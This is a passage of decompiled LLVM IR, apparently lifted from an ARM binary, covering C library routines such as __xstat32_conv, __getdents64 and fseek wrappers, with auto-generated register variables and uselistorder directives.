  store i32 %v5_1e910, i32* %v4_1e910, align 4
  %v0_1e914 = load i32, i32* %r7.global-to-local, align 4
  %v1_1e914 = load i32, i32* %r5.global-to-local, align 4
  %v2_1e914 = add i32 %v1_1e914, 32
  %v3_1e914 = inttoptr i32 %v2_1e914 to i32*
  store i32 %v0_1e914, i32* %v3_1e914, align 4
  %v0_1e918 = load i32, i32* %r8.global-to-local, align 4
  %v1_1e918 = load i32, i32* %r5.global-to-local, align 4
  %v2_1e918 = add i32 %v1_1e918, 36
  %v3_1e918 = inttoptr i32 %v2_1e918 to i32*
  store i32 %v0_1e918, i32* %v3_1e918, align 4
  %v0_1e91c = load i32, i32* %r6.global-to-local, align 4
  %v1_1e91c = add i32 %v0_1e91c, 80
  store i32 %v1_1e91c, i32* %r3.global-to-local, align 4
  %v1_1e920 = add i32 %v0_1e91c, 48
  store i32 %v1_1e920, i32* %r7.global-to-local, align 4
  %v1_1e924 = inttoptr i32 %v1_1e920 to i32*
  %v2_1e924 = load i32, i32* %v1_1e924, align 4
  store i32 %v2_1e924, i32* %r7.global-to-local, align 4
  %v3_1e924 = add i32 %v0_1e91c, 52
  %v4_1e924 = inttoptr i32 %v3_1e924 to i32*
  %v5_1e924 = load i32, i32* %v4_1e924, align 4
  store i32 %v5_1e924, i32* %r8.global-to-local, align 4
  %v1_1e928 = inttoptr i32 %v1_1e91c to i32*
  %v2_1e928 = load i32, i32* %v1_1e928, align 4
  %v3_1e928 = add i32 %v0_1e91c, 84
  %v4_1e928 = inttoptr i32 %v3_1e928 to i32*
  %v5_1e928 = load i32, i32* %v4_1e928, align 4
  store i32 %v5_1e928, i32* %r1.global-to-local, align 4
  %v1_1e92c = add i32 %v0_1e91c, 16
  %v2_1e92c = inttoptr i32 %v1_1e92c to i32*
  %v3_1e92c = load i32, i32* %v2_1e92c, align 4
  store i32 %v3_1e92c, i32* %r2.global-to-local, align 4
  %v0_1e930 = load i32, i32* %r5.global-to-local, align 4
  %v1_1e930 = add i32 %v0_1e930, 80
  %v1_1e934 = inttoptr i32 %v1_1e930 to i32*
  store i32 %v2_1e928, i32* %v1_1e934, align 4
  %v3_1e934 = add i32 %v0_1e930, 84
  %v4_1e934 = inttoptr i32 %v3_1e934 to i32*
  %v5_1e934 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1e934, i32* %v4_1e934, align 4
  %v0_1e938 = load i32, i32* %r7.global-to-local, align 4
  %v1_1e938 = load i32, i32* %r5.global-to-local, align 4
  %v2_1e938 = add i32 %v1_1e938, 48
  %v3_1e938 = inttoptr i32 %v2_1e938 to i32*
  store i32 %v0_1e938, i32* %v3_1e938, align 4
  %v0_1e93c = load i32, i32* %r8.global-to-local, align 4
  %v1_1e93c = load i32, i32* %r5.global-to-local, align 4
  %v2_1e93c = add i32 %v1_1e93c, 52
  %v3_1e93c = inttoptr i32 %v2_1e93c to i32*
  store i32 %v0_1e93c, i32* %v3_1e93c, align 4
  %v0_1e940 = load i32, i32* %r2.global-to-local, align 4
  %v1_1e940 = load i32, i32* %r5.global-to-local, align 4
  %v2_1e940 = add i32 %v1_1e940, 16
  %v3_1e940 = inttoptr i32 %v2_1e940 to i32*
  store i32 %v0_1e940, i32* %v3_1e940, align 4
  %v0_1e944 = load i32, i32* %r6.global-to-local, align 4
  %v1_1e944 = add i32 %v0_1e944, 88
  store i32 %v1_1e944, i32* %r3.global-to-local, align 4
  %v1_1e948 = add i32 %v0_1e944, 20
  %v2_1e948 = inttoptr i32 %v1_1e948 to i32*
  %v3_1e948 = load i32, i32* %v2_1e948, align 4
  store i32 %v3_1e948, i32* %r2.global-to-local, align 4
  %v1_1e94c = inttoptr i32 %v1_1e944 to i32*
  %v2_1e94c = load i32, i32* %v1_1e94c, align 4
  %v3_1e94c = add i32 %v0_1e944, 92
  %v4_1e94c = inttoptr i32 %v3_1e94c to i32*
  %v5_1e94c = load i32, i32* %v4_1e94c, align 4
  store i32 %v5_1e94c, i32* %r1.global-to-local, align 4
  %v1_1e950 = add i32 %v0_1e944, 64
  store i32 %v1_1e950, i32* %r6.global-to-local, align 4
  %v1_1e954 = inttoptr i32 %v1_1e950 to i32*
  %v2_1e954 = load i32, i32* %v1_1e954, align 4
  store i32 %v2_1e954, i32* %r6.global-to-local, align 4
  %v3_1e954 = add i32 %v0_1e944, 68
  %v4_1e954 = inttoptr i32 %v3_1e954 to i32*
  %v5_1e954 = load i32, i32* %v4_1e954, align 4
  store i32 %v5_1e954, i32* %r7.global-to-local, align 4
  %v0_1e958 = load i32, i32* %r5.global-to-local, align 4
  %v1_1e958 = add i32 %v0_1e958, 88
  store i32 %v1_1e958, i32* %r3.global-to-local, align 4
  %v2_1e95c = add i32 %v0_1e958, 20
  %v3_1e95c = inttoptr i32 %v2_1e95c to i32*
  store i32 %v3_1e948, i32* %v3_1e95c, align 4
  %v0_1e960 = load i32, i32* %ip.global-to-local, align 4
  %v1_1e960 = load i32, i32* %r5.global-to-local, align 4
  %v2_1e960 = add i32 %v1_1e960, 24
  %v3_1e960 = inttoptr i32 %v2_1e960 to i32*
  store i32 %v0_1e960, i32* %v3_1e960, align 4
  %v0_1e964 = load i32, i32* %lr.global-to-local, align 4
  %v1_1e964 = load i32, i32* %r5.global-to-local, align 4
  %v2_1e964 = add i32 %v1_1e964, 28
  %v3_1e964 = inttoptr i32 %v2_1e964 to i32*
  store i32 %v0_1e964, i32* %v3_1e964, align 4
  %v0_1e968 = load i32, i32* %r6.global-to-local, align 4
  %v1_1e968 = load i32, i32* %r5.global-to-local, align 4
  %v2_1e968 = add i32 %v1_1e968, 64
  %v3_1e968 = inttoptr i32 %v2_1e968 to i32*
  store i32 %v0_1e968, i32* %v3_1e968, align 4
  %v0_1e96c = load i32, i32* %r7.global-to-local, align 4
  %v1_1e96c = load i32, i32* %r5.global-to-local, align 4
  %v2_1e96c = add i32 %v1_1e96c, 68
  %v3_1e96c = inttoptr i32 %v2_1e96c to i32*
  store i32 %v0_1e96c, i32* %v3_1e96c, align 4
  %v0_1e970 = load i32, i32* %r3.global-to-local, align 4
  %v1_1e970 = inttoptr i32 %v0_1e970 to i32*
  store i32 %v2_1e94c, i32* %v1_1e970, align 4
  %v3_1e970 = add i32 %v0_1e970, 4
  %v4_1e970 = inttoptr i32 %v3_1e970 to i32*
  %v5_1e970 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1e970, i32* %v4_1e970, align 4
  %v2_1e974 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_1e974, i32* %r4.global-to-local, align 4
  ret i32 %v2_1e94c

; uselistorder directives
  uselistorder i32 %v0_1e944, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_1e91c, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 3, 8, 4, 5, 6, 7, 9 }
  uselistorder i32* %r5.global-to-local, { 8, 0, 1, 2, 3, 4, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 104, { 0, 4, 1, 2, 3, 6, 5 }
  uselistorder i32 %arg2, { 1, 0, 2 }
}

define i32 @__xstat32_conv(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_1e97c = load i32, i32* @r4, align 4
  store i32 %v3_1e97c, i32* %stack_var_-16, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i32 %tmp, i32* %r5.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 88, i32* %r2.global-to-local, align 4
  %v3_1e994 = inttoptr i32 %arg2 to i8*
  %v4_1e994 = call i32 @__GI_memset(i8* %v3_1e994, i32 0, i32 88)
  %v2_1e998 = load i32, i32* %arg1, align 4
  %v3_1e998 = add i32 %tmp, 4
  %v4_1e998 = inttoptr i32 %v3_1e998 to i32*
  %v5_1e998 = load i32, i32* %v4_1e998, align 4
  store i32 %v5_1e998, i32* %r4.global-to-local, align 4
  %v0_1e99c = load i32, i32* %r6.global-to-local, align 4
  %v1_1e99c = inttoptr i32 %v0_1e99c to i32*
  store i32 %v2_1e998, i32* %v1_1e99c, align 4
  %v3_1e99c = add i32 %v0_1e99c, 4
  %v4_1e99c = inttoptr i32 %v3_1e99c to i32*
  %v5_1e99c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_1e99c, i32* %v4_1e99c, align 4
  %v0_1e9a0 = load i32, i32* %r5.global-to-local, align 4
  %v1_1e9a0 = add i32 %v0_1e9a0, 32
  %v1_1e9a4 = inttoptr i32 %v1_1e9a0 to i32*
  %v2_1e9a4 = load i32, i32* %v1_1e9a4, align 4
  %v3_1e9a4 = add i32 %v0_1e9a0, 36
  %v4_1e9a4 = inttoptr i32 %v3_1e9a4 to i32*
  %v5_1e9a4 = load i32, i32* %v4_1e9a4, align 4
  store i32 %v5_1e9a4, i32* %r4.global-to-local, align 4
  %v1_1e9a8 = add i32 %v0_1e9a0, 96
  %v2_1e9a8 = inttoptr i32 %v1_1e9a8 to i32*
  %v3_1e9a8 = load i32, i32* %v2_1e9a8, align 4
  store i32 %v3_1e9a8, i32* %r2.global-to-local, align 4
  %v1_1e9ac = load i32, i32* %r6.global-to-local, align 4
  %v2_1e9ac = add i32 %v1_1e9ac, 32
  %v3_1e9ac = inttoptr i32 %v2_1e9ac to i32*
  store i32 %v2_1e9a4, i32* %v3_1e9ac, align 4
  %v0_1e9b0 = load i32, i32* %r4.global-to-local, align 4
  %v1_1e9b0 = load i32, i32* %r6.global-to-local, align 4
  %v2_1e9b0 = add i32 %v1_1e9b0, 36
  %v3_1e9b0 = inttoptr i32 %v2_1e9b0 to i32*
  store i32 %v0_1e9b0, i32* %v3_1e9b0, align 4
  %v0_1e9b4 = load i32, i32* %r2.global-to-local, align 4
  %v1_1e9b4 = load i32, i32* %r6.global-to-local, align 4
  %v2_1e9b4 = add i32 %v1_1e9b4, 12
  %v3_1e9b4 = inttoptr i32 %v2_1e9b4 to i32*
  store i32 %v0_1e9b4, i32* %v3_1e9b4, align 4
  %v0_1e9b8 = load i32, i32* %r5.global-to-local, align 4
  %v1_1e9b8 = add i32 %v0_1e9b8, 48
  %v2_1e9b8 = inttoptr i32 %v1_1e9b8 to i32*
  %v3_1e9b8 = load i32, i32* %v2_1e9b8, align 4
  %v1_1e9bc = add i32 %v0_1e9b8, 24
  store i32 %v1_1e9bc, i32* %ip.global-to-local, align 4
  %v1_1e9c0 = inttoptr i32 %v1_1e9bc to i32*
  %v2_1e9c0 = load i32, i32* %v1_1e9c0, align 4
  store i32 %v2_1e9c0, i32* %ip.global-to-local, align 4
  %v3_1e9c0 = add i32 %v0_1e9b8, 28
  %v4_1e9c0 = inttoptr i32 %v3_1e9c0 to i32*
  %v5_1e9c0 = load i32, i32* %v4_1e9c0, align 4
  store i32 %v5_1e9c0, i32* %lr.global-to-local, align 4
  %v1_1e9c4 = load i32, i32* %r6.global-to-local, align 4
  %v2_1e9c4 = add i32 %v1_1e9c4, 44
  %v3_1e9c4 = inttoptr i32 %v2_1e9c4 to i32*
  store i32 %v3_1e9b8, i32* %v3_1e9c4, align 4
  %v0_1e9c8 = load i32, i32* %r5.global-to-local, align 4
  %v1_1e9c8 = add i32 %v0_1e9c8, 64
  %v2_1e9c8 = inttoptr i32 %v1_1e9c8 to i32*
  %v3_1e9c8 = load i32, i32* %v2_1e9c8, align 4
  %v1_1e9cc = add i32 %v0_1e9c8, 56
  %v2_1e9cc = inttoptr i32 %v1_1e9cc to i32*
  %v3_1e9cc = load i32, i32* %v2_1e9cc, align 4
  store i32 %v3_1e9cc, i32* %r2.global-to-local, align 4
  %v1_1e9d0 = load i32, i32* %r6.global-to-local, align 4
  %v2_1e9d0 = add i32 %v1_1e9d0, 52
  %v3_1e9d0 = inttoptr i32 %v2_1e9d0 to i32*
  store i32 %v3_1e9c8, i32* %v3_1e9d0, align 4
  %v0_1e9d4 = load i32, i32* %r2.global-to-local, align 4
  %v1_1e9d4 = load i32, i32* %r6.global-to-local, align 4
  %v2_1e9d4 = add i32 %v1_1e9d4, 48
  %v3_1e9d4 = inttoptr i32 %v2_1e9d4 to i32*
  store i32 %v0_1e9d4, i32* %v3_1e9d4, align 4
  %v0_1e9d8 = load i32, i32* %r5.global-to-local, align 4
  %v1_1e9d8 = add i32 %v0_1e9d8, 72
  %v1_1e9dc = inttoptr i32 %v1_1e9d8 to i32*
  %v2_1e9dc = load i32, i32* %v1_1e9dc, align 4
  %v3_1e9dc = add i32 %v0_1e9d8, 76
  %v4_1e9dc = inttoptr i32 %v3_1e9dc to i32*
  %v5_1e9dc = load i32, i32* %v4_1e9dc, align 4
  store i32 %v5_1e9dc, i32* %r1.global-to-local, align 4
  %v0_1e9e0 = load i32, i32* %r6.global-to-local, align 4
  %v1_1e9e0 = add i32 %v0_1e9e0, 56
  %v1_1e9e4 = inttoptr i32 %v1_1e9e0 to i32*
  store i32 %v2_1e9dc, i32* %v1_1e9e4, align 4
  %v3_1e9e4 = add i32 %v0_1e9e0, 60
  %v4_1e9e4 = inttoptr i32 %v3_1e9e4 to i32*
  %v5_1e9e4 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1e9e4, i32* %v4_1e9e4, align 4
  %v0_1e9e8 = load i32, i32* %r5.global-to-local, align 4
  %v1_1e9e8 = add i32 %v0_1e9e8, 80
  %v1_1e9ec = inttoptr i32 %v1_1e9e8 to i32*
  %v2_1e9ec = load i32, i32* %v1_1e9ec, align 4
  %v3_1e9ec = add i32 %v0_1e9e8, 84
  %v4_1e9ec = inttoptr i32 %v3_1e9ec to i32*
  %v5_1e9ec = load i32, i32* %v4_1e9ec, align 4
  store i32 %v5_1e9ec, i32* %r1.global-to-local, align 4
  %v0_1e9f0 = load i32, i32* %r6.global-to-local, align 4
  %v1_1e9f0 = add i32 %v0_1e9f0, 64
  %v1_1e9f4 = inttoptr i32 %v1_1e9f0 to i32*
  store i32 %v2_1e9ec, i32* %v1_1e9f4, align 4
  %v3_1e9f4 = add i32 %v0_1e9f0, 68
  %v4_1e9f4 = inttoptr i32 %v3_1e9f4 to i32*
  %v5_1e9f4 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1e9f4, i32* %v4_1e9f4, align 4
  %v0_1e9f8 = load i32, i32* %r5.global-to-local, align 4
  %v1_1e9f8 = add i32 %v0_1e9f8, 16
  %v2_1e9f8 = inttoptr i32 %v1_1e9f8 to i32*
  %v3_1e9f8 = load i32, i32* %v2_1e9f8, align 4
  %v1_1e9fc = load i32, i32* %r6.global-to-local, align 4
  %v2_1e9fc = add i32 %v1_1e9fc, 16
  %v3_1e9fc = inttoptr i32 %v2_1e9fc to i32*
  store i32 %v3_1e9f8, i32* %v3_1e9fc, align 4
  %v0_1ea00 = load i32, i32* %r5.global-to-local, align 4
  %v1_1ea00 = add i32 %v0_1ea00, 88
  %v1_1ea04 = add i32 %v0_1ea00, 20
  %v2_1ea04 = inttoptr i32 %v1_1ea04 to i32*
  %v3_1ea04 = load i32, i32* %v2_1ea04, align 4
  store i32 %v3_1ea04, i32* %r2.global-to-local, align 4
  %v1_1ea08 = inttoptr i32 %v1_1ea00 to i32*
  %v2_1ea08 = load i32, i32* %v1_1ea08, align 4
  %v3_1ea08 = add i32 %v0_1ea00, 92
  %v4_1ea08 = inttoptr i32 %v3_1ea08 to i32*
  %v5_1ea08 = load i32, i32* %v4_1ea08, align 4
  store i32 %v5_1ea08, i32* %r1.global-to-local, align 4
  %v0_1ea0c = load i32, i32* %r6.global-to-local, align 4
  %v1_1ea0c = add i32 %v0_1ea0c, 72
  %v1_1ea10 = inttoptr i32 %v1_1ea0c to i32*
  store i32 %v2_1ea08, i32* %v1_1ea10, align 4
  %v3_1ea10 = add i32 %v0_1ea0c, 76
  %v4_1ea10 = inttoptr i32 %v3_1ea10 to i32*
  %v5_1ea10 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1ea10, i32* %v4_1ea10, align 4
  %v0_1ea14 = load i32, i32* %r2.global-to-local, align 4
  %v1_1ea14 = load i32, i32* %r6.global-to-local, align 4
  %v2_1ea14 = add i32 %v1_1ea14, 20
  %v3_1ea14 = inttoptr i32 %v2_1ea14 to i32*
  store i32 %v0_1ea14, i32* %v3_1ea14, align 4
  %v0_1ea18 = load i32, i32* %ip.global-to-local, align 4
  %v1_1ea18 = load i32, i32* %r6.global-to-local, align 4
  %v2_1ea18 = add i32 %v1_1ea18, 24
  %v3_1ea18 = inttoptr i32 %v2_1ea18 to i32*
  store i32 %v0_1ea18, i32* %v3_1ea18, align 4
  %v0_1ea1c = load i32, i32* %lr.global-to-local, align 4
  %v1_1ea1c = load i32, i32* %r6.global-to-local, align 4
  %v2_1ea1c = add i32 %v1_1ea1c, 28
  %v3_1ea1c = inttoptr i32 %v2_1ea1c to i32*
  store i32 %v0_1ea1c, i32* %v3_1ea1c, align 4
  %v2_1ea20 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1ea20, i32* %r4.global-to-local, align 4
  ret i32 %v2_1ea08

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 92, { 0, 1, 2, 4, 3, 5, 6, 7, 9, 8 }
  uselistorder i32 84, { 2, 3, 0, 4, 5, 1, 6, 7, 8 }
  uselistorder i32 96, { 7, 4, 5, 1, 2, 3, 8, 9, 0, 6 }
  uselistorder i32 %arg2, { 1, 0, 2 }
}

define i32 @__getdents64(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %v6_1ea2c = load i32, i32* @r5, align 4
  %v12_1ea2c = load i32, i32* @r7, align 4
  %v1_1ea30 = add i32 %arg3, 14
  %v2_1ea38 = ptrtoint i32* %stack_var_-72 to i32
  %v1_1ea3c = and i32 %v1_1ea30, -8
  %v2_1ea40 = sub i32 %v2_1ea38, %v1_1ea3c
  %v1_1ea44 = add i32 %v2_1ea40, 8
  store i32 %tmp, i32* %sl.global-to-local, align 4
  store i32 %tmp, i32* @r5, align 4
  store i32 %arg1, i32* %r1.global-to-local, align 4
  %tmp23 = icmp ult i32 %arg1, -4095
  br i1 %tmp23, label %dec_label_pc_1ea88, label %dec_label_pc_1ea6c

dec_label_pc_1ea6c:                               ; preds = %entry
  %v1_1ea70 = sub i32 0, %arg1
  %v3_1ea74 = load i16, i16* @global_var_32088.1320, align 2
  %v4_1ea74 = sext i16 %v3_1ea74 to i32
  %v0_1ea78 = call i32 @__aeabi_read_tp()
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_1ea80 = add i32 %v4_1ea74, %v0_1ea78
  %v4_1ea80 = inttoptr i32 %v3_1ea80 to i32*
  store i32 %v1_1ea70, i32* %v4_1ea80, align 4
  br label %dec_label_pc_1eb58

dec_label_pc_1ea88:                               ; preds = %entry
  br i1 false, label %dec_label_pc_1eb58, label %dec_label_pc_1ea90

dec_label_pc_1ea90:                               ; preds = %dec_label_pc_1ea88
  %v2_1ea90 = add i32 %v1_1ea44, %arg1
  store i32 %v2_1ea90, i32* %r1.global-to-local, align 4
  %v2_1ea94 = add i32 %tmp, %arg3
  store i32 %v1_1ea44, i32* @r7, align 4
  store i32 -1, i32* %r8.global-to-local, align 4
  store i32 -1, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_1eb40

dec_label_pc_1eab0:                               ; preds = %dec_label_pc_1eb40
  %v1_1eab0 = add i32 %v0_1eb10, 16
  %v2_1eab0 = inttoptr i32 %v1_1eab0 to i16*
  %v3_1eab0 = load i16, i16* %v2_1eab0, align 2
  %v4_1eab0 = zext i16 %v3_1eab0 to i32
  %v1_1eab4 = add nsw i32 %v4_1eab0, -19
  store i32 %v1_1eab4, i32* @r2, align 4
  %v1_1eab8 = add nuw nsw i32 %v4_1eab0, 7
  %v1_1eabc = and i32 %v1_1eab8, 131064
  store i32 %v1_1eabc, i32* @ip, align 4
  %v2_1eac4 = add i32 %v1_1eabc, %v0_1eb18
  store i32 %v2_1eac4, i32* %r6.global-to-local, align 4
  %tmp24 = icmp ugt i32 %v2_1eac4, %v2_1ea94
  br i1 %tmp24, label %dec_label_pc_1ead0, label %dec_label_pc_1eb0c

dec_label_pc_1ead0:                               ; preds = %dec_label_pc_1eab0
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_1ead8 = load i32, i32* %r8.global-to-local, align 4
  %v0_1eadc = load i32, i32* %sb.global-to-local, align 4
  %v1_1eae0 = load i32, i32* @sp, align 4
  %v2_1eae0 = inttoptr i32 %v1_1eae0 to i32*
  store i32 0, i32* %v2_1eae0, align 4
  %v4_1eae4 = call i32 @__GI_lseek64(i32 %arg1, i32 0, i32 %v0_1ead8, i32 %v0_1eadc)
  %v0_1eae8 = load i32, i32* @r5, align 4
  %v1_1eae8 = load i32, i32* %sl.global-to-local, align 4
  %v9_1eae8 = icmp eq i32 %v0_1eae8, %v1_1eae8
  br i1 %v9_1eae8, label %dec_label_pc_1eaf0, label %dec_label_pc_1eb54

dec_label_pc_1eaf0:                               ; preds = %dec_label_pc_1ead0
  %v0_1eaf4 = call i32 @__aeabi_read_tp()
  %v3_1eaf8 = load i16, i16* @global_var_32088.1320, align 2
  %v4_1eaf8 = sext i16 %v3_1eaf8 to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_1eb04 = add i32 %v4_1eaf8, %v0_1eaf4
  %v4_1eb04 = inttoptr i32 %v3_1eb04 to i32*
  store i32 22, i32* %v4_1eb04, align 4
  br label %dec_label_pc_1eb58

dec_label_pc_1eb0c:                               ; preds = %dec_label_pc_1eab0
  %v1_1eb0c = inttoptr i32 %v0_1eb10 to i32*
  %v2_1eb0c = load i32, i32* %v1_1eb0c, align 4
  %v3_1eb0c = add i32 %v0_1eb10, 4
  %v4_1eb0c = inttoptr i32 %v3_1eb0c to i32*
  %v5_1eb0c = load i32, i32* %v4_1eb0c, align 4
  store i32 %v5_1eb0c, i32* @r4, align 4
  %v1_1eb10 = add i32 %v0_1eb10, 8
  store i32 %v1_1eb10, i32* %r8.global-to-local, align 4
  %v1_1eb14 = inttoptr i32 %v1_1eb10 to i32*
  %v2_1eb14 = load i32, i32* %v1_1eb14, align 4
  store i32 %v2_1eb14, i32* %r8.global-to-local, align 4
  %v3_1eb14 = add i32 %v0_1eb10, 12
  %v4_1eb14 = inttoptr i32 %v3_1eb14 to i32*
  %v5_1eb14 = load i32, i32* %v4_1eb14, align 4
  store i32 %v5_1eb14, i32* %sb.global-to-local, align 4
  %v1_1eb18 = inttoptr i32 %v0_1eb18 to i32*
  store i32 %v2_1eb0c, i32* %v1_1eb18, align 4
  %v3_1eb18 = add i32 %v0_1eb18, 4
  %v4_1eb18 = inttoptr i32 %v3_1eb18 to i32*
  %v5_1eb18 = load i32, i32* @r4, align 4
  store i32 %v5_1eb18, i32* %v4_1eb18, align 4
  %v0_1eb1c = load i32, i32* %r8.global-to-local, align 4
  %v1_1eb1c = load i32, i32* @r5, align 4
  %v2_1eb1c = add i32 %v1_1eb1c, 8
  %v3_1eb1c = inttoptr i32 %v2_1eb1c to i32*
  store i32 %v0_1eb1c, i32* %v3_1eb1c, align 4
  %v0_1eb20 = load i32, i32* %sb.global-to-local, align 4
  %v1_1eb20 = load i32, i32* @r5, align 4
  %v2_1eb20 = add i32 %v1_1eb20, 12
  %v3_1eb20 = inttoptr i32 %v2_1eb20 to i32*
  store i32 %v0_1eb20, i32* %v3_1eb20, align 4
  %v0_1eb24 = load i32, i32* @ip, align 4
  %v1_1eb24 = trunc i32 %v0_1eb24 to i16
  %v2_1eb24 = load i32, i32* @r5, align 4
  %v3_1eb24 = add i32 %v2_1eb24, 16
  %v4_1eb24 = inttoptr i32 %v3_1eb24 to i16*
  store i16 %v1_1eb24, i16* %v4_1eb24, align 2
  %v0_1eb28 = load i32, i32* @r7, align 4
  %v1_1eb28 = add i32 %v0_1eb28, 18
  %v2_1eb28 = inttoptr i32 %v1_1eb28 to i8*
  %v3_1eb28 = load i8, i8* %v2_1eb28, align 1
  %v4_1eb28 = zext i8 %v3_1eb28 to i32
  store i32 %v4_1eb28, i32* @r3, align 4
  %v2_1eb2c = load i32, i32* @r5, align 4
  %v3_1eb2c = add i32 %v2_1eb2c, 18
  %v4_1eb2c = inttoptr i32 %v3_1eb2c to i8*
  store i8 %v3_1eb28, i8* %v4_1eb2c, align 1
  %v0_1eb30 = call i32 @memcpy()
  %v0_1eb34 = load i32, i32* @r7, align 4
  %v1_1eb34 = add i32 %v0_1eb34, 16
  %v2_1eb34 = inttoptr i32 %v1_1eb34 to i16*
  %v3_1eb34 = load i16, i16* %v2_1eb34, align 2
  %v4_1eb34 = zext i16 %v3_1eb34 to i32
  %v0_1eb38 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_1eb38, i32* @r5, align 4
  %v2_1eb3c = add i32 %v4_1eb34, %v0_1eb34
  store i32 %v2_1eb3c, i32* @r7, align 4
  br label %dec_label_pc_1eb40

dec_label_pc_1eb40:                               ; preds = %dec_label_pc_1ea90, %dec_label_pc_1eb0c
  %v0_1eb18 = phi i32 [ %tmp, %dec_label_pc_1ea90 ], [ %v0_1eb38, %dec_label_pc_1eb0c ]
  %v0_1eb10 = phi i32 [ %v1_1ea44, %dec_label_pc_1ea90 ], [ %v2_1eb3c, %dec_label_pc_1eb0c ]
  %v3_1eb44 = icmp ult i32 %v0_1eb10, %v2_1ea90
  %v1_1eb48 = add i32 %v0_1eb18, 19
  store i32 %v1_1eb48, i32* @r0, align 4
  %v1_1eb4c = add i32 %v0_1eb10, 19
  store i32 %v1_1eb4c, i32* @r1, align 4
  br i1 %v3_1eb44, label %dec_label_pc_1eab0, label %dec_label_pc_1eb54.loopexit

dec_label_pc_1eb54.loopexit:                      ; preds = %dec_label_pc_1eb40
  %v0_1eb54.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_1eb54

dec_label_pc_1eb54:                               ; preds = %dec_label_pc_1eb54.loopexit, %dec_label_pc_1ead0
  %v1_1eb54 = phi i32 [ %v0_1eb18, %dec_label_pc_1eb54.loopexit ], [ %v0_1eae8, %dec_label_pc_1ead0 ]
  %v0_1eb54 = phi i32 [ %v0_1eb54.pre, %dec_label_pc_1eb54.loopexit ], [ %v1_1eae8, %dec_label_pc_1ead0 ]
  %v2_1eb54 = sub i32 %v1_1eb54, %v0_1eb54
  store i32 %v2_1eb54, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1eb58

dec_label_pc_1eb58:                               ; preds = %dec_label_pc_1ea88, %dec_label_pc_1eaf0, %dec_label_pc_1ea6c, %dec_label_pc_1eb54
  %v0_1eb58 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v6_1ea2c, i32* @r5, align 4
  store i32 %v12_1ea2c, i32* @r7, align 4
  ret i32 %v0_1eb58

; uselistorder directives
  uselistorder i32 %v0_1eb10, { 5, 6, 4, 2, 3, 0, 1 }
  uselistorder i32 %v0_1eb18, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v1_1ea44, { 1, 2, 0 }
  uselistorder i32 %tmp, { 0, 1, 3, 2, 4 }
  uselistorder i32* %r1.global-to-local, { 6, 1, 2, 3, 4, 5, 7, 0 }
  uselistorder i32 19, { 1, 2, 0, 4, 3 }
  uselistorder i32 18, { 2, 3, 5, 0, 1, 4 }
  uselistorder i32* @sp, { 9, 26, 27, 0, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 1, 2, 3, 4, 5, 6, 7, 25, 8 }
  uselistorder i32 %arg1, { 2, 1, 3, 0, 4 }
  uselistorder label %dec_label_pc_1eb58, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_1eb40, { 1, 0 }
}

define i32 @__GI_fseek() local_unnamed_addr {
entry:
  %v0_1eb7c = load i32, i32* @r1, align 4
  store i32 %v0_1eb7c, i32* @r2, align 4
  %v0_1eb84 = call i32 @__GI_fseeko64()
  ret i32 %v0_1eb84
}

define i32 @__GI_fseeko64() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp18 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-40 = alloca i32, align 4
  %v3_1eb94 = load i32, i32* @r4, align 4
  %v6_1eb94 = load i32, i32* @r5, align 4
  %v12_1eb94 = load i32, i32* @r7, align 4
  %v2_1eb98 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %tmp18, i32* %sl.global-to-local, align 4
  %v2_1eba0 = icmp ugt i32 %tmp18, 1
  store i1 %v2_1eba0, i1* %cpsr_c.global-to-local, align 1
